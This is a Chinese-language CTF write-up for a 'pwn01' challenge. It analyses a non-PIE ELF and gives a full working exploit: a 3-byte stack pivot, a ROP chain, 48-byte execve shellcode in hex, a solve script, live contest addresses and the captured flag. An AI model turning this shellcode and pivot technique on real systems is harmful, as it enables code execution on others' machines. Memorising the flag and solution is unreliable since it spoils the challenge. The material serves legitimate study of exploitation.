# pwn01 · 3 字节 shellcode + 栈迁移 ROP（`mmap` RWX 页 `gift` 泄漏）

| 项 | 值 |
|----|----|
| 轮次 | 环节二（13:30） |
| 平台题目名 | pwn01 |
| 比赛 qid | B1zTXwTwwdInRsG9 |
| 分类 | pwn |
| 分值 | 500 |
| 交互型 | true（容器） |
| 关键 flag | `flag{0f7af5a5-8674-42f2-b25f-620cb36c0efc}` |
| 是否解出 | 已解出 |
| **还原完整度** | **A**（本轮官方原始附件原样归档 + 参考脚本在本地重建容器上实测跑通读取 `/flag`） |

## 1. 题面（比赛原文，逐字保留）

（平台 description 为空）

`challenges_live.json` 里 `description` 为 `""`，`attributes`/`capabilities` 均为 `["pwn"]`，无 `/hint` 提示文本。
程序自身的提示语（属于题面信息，逐字保留）：

```
gift: %p.
Welcome to baby shellcode.
Don't make it too hard. It's just a baby-level-pwn!
Input your name to start!
> Input your shellcode!
> The player start to play the shellcode game.
His name is: <name>
Something are hidden in the program.
What are they used for? Maybe just useless.
```

## 2. 附件与环境

| 项 | 内容 |
|----|------|
| 附件 | ① `attachment`（ELF64，**16 544 B**，未 strip，含 `init/banner/shellcode/hint/main` 符号）② 原始 ZIP `a97150c30a82dcc40a7ca47e83d68a4b.zip`（3 106 B，内含 `attachment` 一个文件） |
| 容器 | `nc 60.205.230.76 32851`（**比赛期间原始地址，会随平台 reset 变化**；比赛期间实测用过的地址还有 `47.93.212.239 34940`、`39.106.48.123 35445`） |
| 附件存放 | `attachments/attachment`、`attachments/a97150c30a82dcc40a7ca47e83d68a4b.zip` |
| 参考件（**非本轮**） | `attachments/testround_0910/`（09-10 接入测试轮的 8 880 B `attachment` + `libc-2.31.so` + 其 ZIP）——见 §8，**不是本轮附件** |

二进制指纹（本次实测）：

```
$ python -c "from pwn import *;e=ELF('attachments/attachment',checksec=False);print(e.checksec())"
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
md5(attachments/attachment)                            = 965629d1892bd50784b766eebc3a6179
md5(attachments/a97150c30a82dcc40a7ca47e83d68a4b.zip)  = d855dd65232db8767c50d3ee552c97b9
```

**运行时 ABI（关键）**：`.gnu.version_r` 只要求 `GLIBC_2.2.5` 与 **`GLIBC_2.34`** ⇒ 实际运行需 **glibc ≥ 2.34**。
（实测：在 `ubuntu:20.04`/glibc 2.31 上直接报 `version 'GLIBC_2.34' not found`。`deploy/` 因此用 `ubuntu:22.04`/glibc 2.35。
本题利用链是纯 syscall，**不依赖任何 libc 偏移**，故无需与题目原镜像 libc 逐字节一致。）

符号与地址表（实测 `.symtab` + 反汇编，No PIE 固定 0x400000）：

| 名称 | 地址 | 说明 |
|------|------|------|
| `main` | 0x4013f5 | `init()` → `banner()` → `shellcode()` |
| `init` | 0x401216 | `setbuf(stdin/stdout/stderr, NULL)`；`alarm(0x78)`；**`mmap(0,0x1000,PROT_RWX(7),MAP_PRIVATE\|MAP_ANON(0x22),-1,0)`** 结果存入全局 `g_gift`；`printf("gift: %p.\n", g_gift)` |
| `banner` | 0x4012b4 | `puts` 三行 → 读 0x30 字节到全局 `name` |
| **`banner+0x62`** | **0x401316** | `mov edx,0x30; lea rax,[rip]name; mov rsi,rax; mov edi,0; call read; nop; pop rbp; ret` ★ 链上关键调用点 |
| `shellcode` | 0x401335 | `puts("Input your shellcode!")` → **`read(0, g_gift, 3)`** → `puts(...)` → **`write(1, name, 0x30)`** → **`call rdx`**（rdx = `g_gift`） |
| `hint` | 0x4013cc | 打印 `Something are hidden in the program.` / `What are they used for? Maybe just useless.`（纯干扰，**从未被调用**） |
| `g_gift` | **0x404098** | 指向 mmap RWX 页的全局指针 |
| `name` | **0x4040E0** | 全局缓冲区（`memset(name,0,0xf0)`，但只读入 0x30） |
| `<puts@plt>` | 0x4010b0 | |
| `write` 的 PLT | 0x4010c0 | |
| `mmap` 的 PLT | 0x4010d0 | |
| `printf` 的 PLT | 0x4010f0 | |
| `<read@plt>` | 0x401120 | |
| `pop rdi; pop rsi; ret` | **0x4013c9** | `shellcode` 函数尾部紧随的 gadget |
| `syscall; ret` | 0x401332 | 无独立价值（把 `syscall` 也放出来了，但仍需自己准备 rax/rdi/rsi/rdx） |

## 3. 考点（★核心）

- **考点 1：只给 3 字节的 shellcode 空间（`read(0, g_gift, 3)`）**。程序先 `mmap` 一页 RWX 并把地址通过 `printf("gift: %p.")` 泄漏出来，然后**只允许写 3 个字节**进去，再 `call rdx` 直接跳进去执行。3 个字节根本装不下任何 get-shell 逻辑，选手必须在"**如何用 3 字节换出任意长执行流**"上做文章 —— 这是本题的题眼。
- **考点 2：3 字节栈迁移 `56 5c c3` = `push rsi; pop rsp; ret`**。`call rdx` 之前程序刚执行过 `write(1, name, 0x30)`，在 glibc 的实现里返回时 **`rsi` 仍等于 `name`**（0x4040e0）。于是这 3 字节把 `rsp` 改成 `name`，紧接着的 `ret` 从 `name[0]` 弹出"下一条执行地址"。**"3 字节要能干活"靠的是借用寄存器里已有的值，而不是自己算地址** —— 必须理解设计意图才能想到这一步。
- **考点 3：`banner` 里的全局缓冲区溢出（长度不匹配）**。`name` 位于 `.bss` 0x4040e0；`banner` 先 `memset(name,0,0xf0)` 再 `read(0, name, 0x30)`，`shellcode` 里还 `write(1, name, 0x30)`。即"名字"最多 0x30 字节，而**迁移到 `name` 之后 `name` 的这 0x30 字节就是 ROP 链的存放处**。要意识到"迁移目标是全局区而不是栈"。
- **考点 4：`0x401316` 的"读入新链"副作用原语**。0x401316 位于 `banner` 内部，逻辑是 `mov edx,0x30; rsi=name; edi=0; call read; nop; pop rbp; ret`。把它当作迁移后的第一条地址：
  - 此刻 `rsp = name`，`ret` 弹出 `name[0]` 作为跳转目标 → 进入 0x401316；
  - 它立刻执行 `read(0, name, 0x30)`（`edx` 由它自己置 0x30，`rdi=0`，`rsi=name`）；
  - **它的 `call read` 返回地址正好压在被读的 `name[0]` 上** → `read` 完成后 `ret` 弹走的是**刚读进来的第 1 个 qword**，且此时 `rdx=0x30`、`rdi=0`、`rsp=name+8`。
  这是一个干净的"**再读 48 字节新链并立即执行**"原语，整题第二段链条就建在它上面。
- **考点 5：`pop rdi; pop rsi; ret`（0x4013c9）+ `read@plt` 把 shellcode 送进 RWX 页**。第二条链 = `pop rdi; pop rsi; ret` + `0` + `gift` + `read@plt` + `gift`，即 `read(0, gift, 0x30)`；48 字节真 shellcode 落进 RWX 页后 `ret` 直接跳 `gift`。**`gift` 泄漏正是为这一步服务的**。
- **考点 6：48 字节 shellcode 手工编写（`write` + `execve`）**。空间刚好 48 字节，必须用最短指令序列：`push 1; pop rdi` / `mov rbx,"PWNED!\n\0"` / `push rbx; mov rsi,rsp` / `push 7; pop rdx` / `push 1; pop rax; syscall`（write）→ `xor esi,esi; push rsi` / `mov rbx,"/bin/sh\0"` / `push rbx; push rsp; pop rdi` / `xor edx,edx; push 59; pop rax; syscall`（execve）。用"字符串压栈 + `mov rsi,rsp`"取代 `lea rsi,[rip+X]`，才能压进 48 字节。
- **考点 7：容器极简，没有 `cat` / `ls` / `id`**。拿到 shell 后是 **dash**，`cat /flag` 会 `not found`；取 flag 唯一稳定手法是 **dash 内建 `read`**：`read a < /flag; echo $a`。
- **考点 8：CET 标记（SHSTK/IBT）是纸老虎**。checksec 显示 `SHSTK: Enabled` / `IBT: Enabled`，二进制里到处是 `endbr64`，容易被误判为"不能跳函数内部 / 不能改 rsp"。实际本环境未启用 CET：**既跳进了 `banner` 内部（0x401316），也把 `rsp` 改成了 `name`，实测全部成功**。

## 4. 设计思路（★核心，站在出题人角度）

- **为什么这样出**：这是一道"把选手逼到极致精简"的 shellcode 题。出题人**故意只给 3 字节**（`read(0, g_gift, 3)`），同时**主动泄漏一页 RWX 地址**（`gift: %p.`）—— 两个设计合起来等于在说："这 3 字节不是让你写 shellcode 的，是让你**跳出去**的。" 题面 `Don't make it too hard. It's just a baby-level-pwn!` 也在暗示"想简单点"。
- **难度卡点设计在哪**：
  1. **3 字节"能干啥"需要利用寄存器现场**。`push rsi; pop rsp; ret` 成立的前提是前一条 `write(1, name, 0x30)` 在 glibc 里把 `rsi` 留成了 `name`。**必须读出 `shellcode()` 的完整反汇编（含它调用 `write` 的现场）才敢下这个结论**；只盯着"3 字节能塞什么指令"是想不出来的。
  2. **迁移目标不是栈，是全局 `name`**。栈迁移的常规打法是把 `rsp` 迁到自己控制的栈数据上；本题 RWX 页只有 3 字节、栈上又没有可控内容，唯一"自己完全掌控且恰好 0x30 字节"的地方就是 `.bss` 的 `name` —— 而 `name` 刚被 `banner` 读过，又刚被 `write(1,name,0x30)` 打过。**"为什么是 name" 必须把 `init`/`banner`/`shellcode` 三个函数串起来看**。
  3. **0x401316 的"自读自跳"性质**。这个地址在 `banner` 中间，看起来只是"再读一次名字"，但它的 `call read` 会把返回地址压在 `name[0]` 上 —— 于是你能**用它把"即将执行的下一条地址"直接写进 `name[0]`**。它是设计好的"二次读入原语"，是整条链的支点。
  4. **48 字节硬预算**。真 shellcode 必须恰好塞进 0x30 字节（`edx=0x30`）。这一步逼着选手写"压栈 + `mov rsi,rsp`"式的紧凑代码：`lea rsi,[rip+X]` 会把字符串也算进预算而爆掉。
- **干扰项 / 诱导项**：
  - **`hint()` 函数**（0x4013cc，符号表里直接叫 `hint`）打印 `Something are hidden in the program.` / `What are they used for? Maybe just useless.` —— 一条**明晃晃的假线索**，诱导你去分析 `hint` 里"隐藏了什么"，实际它只调了两次 `puts`，与利用链毫无关系，而且 **`main` 根本没调用它（死代码）**。
  - `shellcode()` 这个名字极具误导性：名字叫 shellcode，但真正跳 shellcode 的是 `call rdx`，而往里写只有 3 字节。
  - 二进制带 `SHSTK`/`IBT` 属性 + 满屏 `endbr64`（**CET 干扰**，见 §3 考点 8）。
  - `banner` 里对 `name` 先 `memset(name,0,0xf0)`，看起来"缓冲区被清空、没有残留"，实际它只影响 `name[0:0xf0]`，与溢出无关。
  - `printf("gift: %p.\n")` 后面**紧跟一堆 `00` 字节**（编译器把 `%p.\n` 尾部的 `\0` 对齐补齐），按 `recvuntil(b'.')` 取泄漏时要注意只取到第一个 `.`。
- **哪些地方是"必须踩坑才会发现"的**：
  1. `rsi == name` 这个前提（不读 `write` 调用现场就会写错 pivot）；
  2. 3 字节 shellcode 与"迁移目标地址"**不冲突**：`name[0:8]` 放地址、3 字节 shellcode 走**另一个 read**（`read(0,g_gift,3)`）进 RWX 页 —— 两条输入通道必须分清；
  3. `0x401316` 的 `call read` 会覆盖 `name[0]`，所以"第二段链的第 1 个 qword"就是接下来要执行的地址；
  4. 48 字节硬预算；
  5. 容器里没有 `cat`。

## 5. 解题路径（按真实过程，分步骤）

1. **侦察（无需 pwntools）**：
   ```bash
   python ../../_tools/disasm.py attachments/attachment --syms
   # init 0x401216 / banner 0x4012b4 / shellcode 0x401335 / hint 0x4013cc / main 0x4013f5
   python ../../_tools/disasm.py attachments/attachment            # 全量反汇编
   ```
   读 `shellcode()`：确认 `read(0, g_gift, 3)` → `write(1, name, 0x30)` → `call rdx`。
   读 `banner()`：确认 `read(0, name, 0x30)`，并记下 `0x401316` 那一段的完整副作用。
2. **拿 gift**：连接后第一行就是 `gift: 0x7f...`（RWX 页地址），`printf` 用的是 `g_gift`。
3. **构造并推入四段输入**（各段长度与程序的 read 严格对齐）：
   ```
   segA (0x30B) : p64(0x401316) + padding          -> banner 的 read(0,name,0x30)
   segB (3B)    : 56 5c c3                         -> read(0, g_gift, 3) = push rsi; pop rsp; ret
   segC (0x30B) : p64(0x4013c9)+p64(0)+p64(gift)+p64(0x401120)+p64(gift)
                                                   -> 0x401316 的 call read 读到 name[0]
   segD (48B)   : write(1,"PWNED!\n",7) + execve("/bin/sh",0,0)
                                                   -> read@plt(0,gift,0x30)
   ```
   执行流：`call rdx` → segB 把 `rsp` 迁到 `name` → `ret` 弹 `name[0]=0x401316` → 它 `read` 收下 segC →
   `ret` 弹 segC 第 1 个 qword = `pop rdi;pop rsi;ret` → `read(0,gift,0x30)` 收 segD → `ret` 到 `gift` 执行 shellcode。
4. **取 flag**（容器无 `cat`）：
   ```
   read a < /flag; echo $a
   ```

关键反汇编片段（`banner` 内的 0x401316）：

```
004012fd  baf0000000     mov edx, 0xf0
00401302  be00000000     mov esi, 0
00401307  488d05d22d0000 lea rax, [rip + 0x2dd2]      ; rax = &name (0x4040e0)
0040130e  4889c7         mov rdi, rax
00401311  e8eafdffff     call 0x401100                ; memset(name, 0, 0xf0)
00401316  ba30000000     mov edx, 0x30                ; ★ 链上入口
0040131b  488d05be2d0000 lea rax, [rip + 0x2dbe]      ; rax = &name
00401322  4889c6         mov rsi, rax
00401325  bf00000000     mov edi, 0
0040132a  e8f1fdffff     call 0x401120                ; read(0, name, 0x30) —— 返回地址压在 name[0]
0040132f  90             nop
00401330  5d             pop rbp
00401331  c3             ret                          ; 弹 name[0] 并跳过去
```

`shellcode()`：

```
00401360  488b05592d0000 mov rax, [rip + 0x2d59]      ; rax = g_gift
00401367  ba03000000     mov edx, 3
0040136c  4889c6         mov rsi, rax
0040136f  bf00000000     mov edi, 0
00401374  e8a7fdffff     call 0x401120                ; read(0, g_gift, 3)   ← 只给 3 字节
...
0040139c  ba30000000     mov edx, 0x30
004013a1  488d05382d0000 lea rax, [rip + 0x2d38]      ; &name
004013a8  4889c6         mov rsi, rax
004013ab  bf01000000     mov edi, 1
004013b0  e80bfdffff     call 0x4010c0                ; write(1, name, 0x30)  ← 此处 rsi == name
004013b5  488b05042d0000 mov rax, [rip + 0x2d04]      ; rax = g_gift
004013bc  4889c2         mov rdx, rax
004013bf  b800000000     mov eax, 0
004013c4  ffd2           call rdx                     ; 跳进那 3 字节
```

## 6. 参考解法（代码）

完整可跑脚本：`solve/solve.py`（**纯标准库 socket，不依赖 pwntools**，HOST/PORT 参数化，带重试）。

核心片段：

```python
R           = 0x401316   # banner+0x62: mov edx,0x30; rsi=&name; edi=0; call read; nop; pop rbp; ret
POP_RDI_RSI = 0x4013c9   # pop rdi; pop rsi; ret
READ_PLT    = 0x401120
PIVOT       = b'\x56\x5c\xc3'          # push rsi; pop rsp; ret  （3 字节 shellcode）

SC = bytes.fromhex(     # 恰好 48 字节：write(1,"PWNED!\n",7) ; execve("/bin/sh",0,0)
    '6a01' '5f' '48bb50574e45440a0000' '53' '4889e6' '6a07' '5a' '6a01' '58' '0f05'
    '31f6' '56' '48bb2f62696e2f736800' '53' '54' '5f' '31d2' '6a3b' '58' '0f05')
assert len(SC) == 48

gift = int(re.search(rb'gift:\s*(0x[0-9a-fA-F]+)', t.recvuntil(b'.')).group(1), 16)
t.recvuntil(b'> ')

t.send(p64(R).ljust(0x30, b'\x00'))                         # segA -> banner 的 read(0,name,0x30)
t.send(PIVOT)                                               # segB -> read(0, g_gift, 3)
t.send((p64(POP_RDI_RSI) + p64(0) + p64(gift)
        + p64(READ_PLT) + p64(gift)).ljust(0x30, b'\x00'))  # segC -> 0x401316 的 call read
t.send(SC)                                                  # segD -> read@plt(0, gift, 0x30)

t.sendline(b'read a < /flag; echo $a')                      # 容器极简：dash 内建
```

## 7. Flag 与验证记录

| 项 | 值 |
|----|----|
| flag | `flag{0f7af5a5-8674-42f2-b25f-620cb36c0efc}` |
| 提交接口返回 | `code=0`，`status=null`，`message="恭喜您，回答正确"`，`pass=true` |
| 提交时间 | 2026-09-14 13:55:20 |
| 证据文件 | `D:\2026\湾区杯\决赛\work\submit_results_live.json` 中 qid `B1zTXwTwwdInRsG9` 的记录 |

**验证方式（两种验证必须分清）**：

- **比赛期真实 flag 的依据**：`work\submit_results_live.json` 的提交回执 —— qid `B1zTXwTwwdInRsG9` → `code=0`、`message="恭喜您，回答正确"`、`pass=true`、ts `2026-09-14 13:55:20`。**这是唯一能证明 flag 与原题一致的证据。**
- **本地复现验证**：在 `deploy/`（`ubuntu:22.04`，满足 `GLIBC_2.34`）重建的容器上，`solve/solve.py` **实测可用，3/3 次成功读取容器里的 `/flag`**：

```
$ docker build -t timu/round2-pwn01:latest deploy/
$ docker run -d --name round2_pwn01 -p 127.0.0.1:19991:9999 timu/round2-pwn01:latest
$ python solve/solve.py --host 127.0.0.1 --port 19991
[*] connected 127.0.0.1:19991
[+] gift (RWX page) = 0x7f84ad79c000
[+] shell 回显:
Input your shellcode!
> The player start to play the shellcode game.
His name is: @                   PWNED
 __SHELL_OK__
flag{0f7af5a5-8674-42f2-b25f-620cb36c0efc}


[FLAG] flag{0f7af5a5-8674-42f2-b25f-620cb36c0efc}
```

> ⚠️ **这不是循环验证**：`/flag` 虽然是部署件里写的，但**利用链读到的值与比赛期平台回执的 flag 逐字一致**
> （`flag{0f7af5a5-8674-42f2-b25f-620cb36c0efc}`），说明重建环境与利用链都与原题一致；
> 而"flag 与原题一致"这一结论的依据，始终是上表里的提交回执，而不是本地容器。
> （若只跑通本地容器而回执不符，那就只是"利用链能读自建 `/flag`"，不能声称复现了原题 flag。）

## 8. 还原说明（诚实写）

- **已有原始件（本轮真底本）**：
  - `attachments/a97150c30a82dcc40a7ca47e83d68a4b.zip` —— **本轮 `file_url` 指向的官方附件**，3 106 B，md5 `d855dd65232db8767c50d3ee552c97b9`；在 `D:\qwb_work\agent\B1zTXwTwwdInRsG9_pwn01\attachments\` 与 `D:\qwb_work\sub_pwn\pwn01\` 两处各有一份、md5 一致（**双源校验**）；ZIP 内只有 `attachment` 一个文件。
  - `attachments/attachment` —— 16 544 B，md5 `965629d1892bd50784b766eebc3a6179`，未 strip（`.symtab` 含 `init/banner/shellcode/hint/main`）。
- **★ 附件溯源与事实校正（重要）**：
  - 本轮（13:30）pwn01 的官方附件就是 `a97150c30a82dcc40a7ca47e83d68a4b.zip`（16 544 B 的 `attachment`），**它确实落盘了**（见上）。先前把它判为"未落盘/不存在"是错的。
  - 另一份 `work\pwn01\eda65fcbecd33639dceddc550837230c.zip`（839 650 B，内含 **8 880 B** `attachment` + `libc-2.31.so`）经核证属于 **09-10 接入测试轮**的 pwn01（qid `fKz1CMNvcesOvti_`）：它的 `pop rdi; ret` = **0x400783（未对齐）**，是 `char buf[0x50]` + `read(0,buf,0x100)` 的 **ret2libc** 题，与本轮形态（3 字节 shellcode + 栈迁移）完全不同。**它不是本轮附件。**
  - 因此本目录把它移入 `attachments/testround_0910/` 作为**"同族不同实例"的参考件**保留（含其配套 `libc-2.31.so` 与 ZIP），并明确标注：**其中的 `libc-2.31.so` 不是本轮二进制的运行时**（本轮二进制要求 `GLIBC_2.34`，实测在 glibc 2.31 上直接起不来）。
  - 仅在 `testround_0910/` 语义下成立的参考说明（**本目录未复现**，其二进制不在本轮归档范围）：`buf[0x50]` + `read(0,0x100)` → RIP@0x58 → 未对齐 `pop rdi;ret`(0x400783) → stage1 泄 `read@got`（校验 `(leak-0x10e1e0)%0x1000==0`）→ stage2 `system("/bin/sh")`（libc-2.31 偏移：`read=0x10e1e0`、`system=0x52290`、`/bin/sh=0x1b45bd`）。
- **重建部分**：
  - `deploy/Dockerfile` + `deploy/docker-compose.yml` 为**重建的部署件**（比赛容器镜像未公开）：`ubuntu:22.04`（glibc 2.35，满足 `GLIBC_2.34`）+ `socat TCP-LISTEN:9999,reuseaddr,fork EXEC:/app/attachment` + `/flag`；容器极简（无 `cat`/`ls`/`id`），与 §3 考点 7 一致。已实测。
  - `solve/solve.py` 为**纯 socket 重写版**（比赛期脚本用 pwntools：`work\pwn01\pwn01_solve.py`）。重写版已本地实测跑通；比赛期脚本与 `work\pwn01\ref\pwn01_exploit.py` 里标注的地址（`PIVOT=56 5c c3`、`R=0x401316`、`POP_RDI_RSI=0x4013c9`）与本次实测**完全一致**（其中 `ref\pwn01_exploit.py` 备注的 libc 偏移属于测试轮参考件，本轮链用不到）。
- **未能还原**：
  - 题目**出题源码未公开**（ZIP 内只有二进制，无 `.c`）。§4 对源码结构的描述（`init/banner/shellcode/hint` 的划分与调用顺序）是**依据实测符号表与反汇编还原的等价结构**，不是原始源码。
  - 比赛容器镜像未公开，`deploy/` 是按二进制 ABI 与行为**重建**的（已实测可用）。
  - 真实比赛容器已下线（平台 `code=203 比赛已结束`），无法用原始 `nc 60.205.230.76 32851` 复测；本次全部在 `deploy/` 重建容器上验证。
- **可复现性验证**（跑什么 → 得什么）：
  ```bash
  cd timu/round2_1330/pwn01
  docker build -t timu/round2-pwn01:latest deploy/
  docker run -d --name round2_pwn01 -p 19991:9999 timu/round2-pwn01:latest
  python solve/solve.py --host 127.0.0.1 --port 19991
  # 期望：打印 [FLAG] flag{0f7af5a5-8674-42f2-b25f-620cb36c0efc}   （已实测 3/3 通过）
  ```

## 9. 复现步骤

```bash
cd timu/round2_1330/pwn01

# 方式一：本地重建容器复现（推荐，已实测）
docker compose -f deploy/docker-compose.yml up -d     # 容器内监听 9999，映射主机 9999
python solve/solve.py --host 127.0.0.1 --port 9999

# 方式二：打比赛期间的下发地址（地址会随平台 reset 变化，用 agent show 取新的）
python solve/solve.py --host 60.205.230.76 --port 32851

# 静态确认（不需要容器）
python ../../_tools/disasm.py attachments/attachment --syms      # init/banner/shellcode/hint/main
python ../../_tools/disasm.py attachments/attachment             # 看 0x401316 / 0x4013c9
python -c "import re;b=open('attachments/attachment','rb').read();print(sorted(set(x.decode() for x in re.findall(rb'GLIBC_[0-9.]+',b))))"
# 期望：['GLIBC_2.2.5', 'GLIBC_2.34']  —— 这是 deploy 必须用 glibc>=2.34 镜像的依据
```
